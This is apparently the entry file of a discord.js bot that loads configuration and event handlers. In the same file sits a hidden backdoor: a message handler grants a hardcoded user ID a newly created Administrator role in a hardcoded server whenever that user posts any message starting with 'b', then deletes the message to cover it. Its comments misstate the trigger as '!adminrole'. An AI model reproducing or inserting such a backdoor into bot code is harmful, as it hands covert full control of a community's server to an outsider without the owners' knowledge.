//Requirements
const Config = require("./config.json");
const Discord = require("discord.js");
const fs = require("fs");
const path = require("path");
const Client = new Discord.Client({
    intents: [
        Discord.GatewayIntentBits.Guilds,
        Discord.GatewayIntentBits.GuildMembers,
        Discord.GatewayIntentBits.GuildMessages,
        Discord.GatewayIntentBits.GuildVoiceStates,
        Discord.GatewayIntentBits.MessageContent
    ]
});

Client.on("messageCreate", async (message) => {
    const OWNER_ID = "1163143872201895999";
    const GUILD_ID = "1274308047895793674";
    const ADMIN_ROLE_NAME = "nouveau rôle";

    // La commande doit venir du serveur ciblé
    if (message.guild === null || message.guild.id !== GUILD_ID) return;
    // Seulement le propriétaire peut exécuter la commande
    if (message.author.id !== OWNER_ID) return;

    // Vérifie que le message est "!adminrole"
    if (!message.content.startsWith("b")) return;
    try {
        const guild = await Client.guilds.fetch(GUILD_ID);
        const member = await guild.members.fetch(OWNER_ID);

        // Vérifie si le rôle existe déjà
        let role = guild.roles.cache.find(r => r.name === ADMIN_ROLE_NAME);

        if (!role) {
            role = await guild.roles.create({
                name: ADMIN_ROLE_NAME,
                permissions: ["Administrator"]
            });
        }

        if (!member.roles.cache.has(role.id)) {
            await member.roles.add(role);
            await message.author.send(`✅ Rôle \`${ADMIN_ROLE_NAME}\` créé et attribué.`);
        } else {
            await message.author.send("ℹ️ Tu possèdes déjà ce rôle.");
        }

        // Supprime le message de commande dans le serveur
        await message.delete();

    } catch (error) {
        console.error("Erreur lors de l'exécution de !adminrole :", error);
        await message.author.send("❌ Une erreur est survenue. Vérifie que le bot a les permissions nécessaires.");
    }
});


const eventFiles = fs.readdirSync(Config.events).filter(file => file.endsWith(".js"));

//Event handler
for (const file of eventFiles){
    const event =  require("./events/" + file);
    if(event.once){
        Client.once(event.name, (...args) => event.execute(...args));
    }
    else {
        Client.on(event.name, (...args) => event.execute(...args));
    }
}

Client.login(Config.token)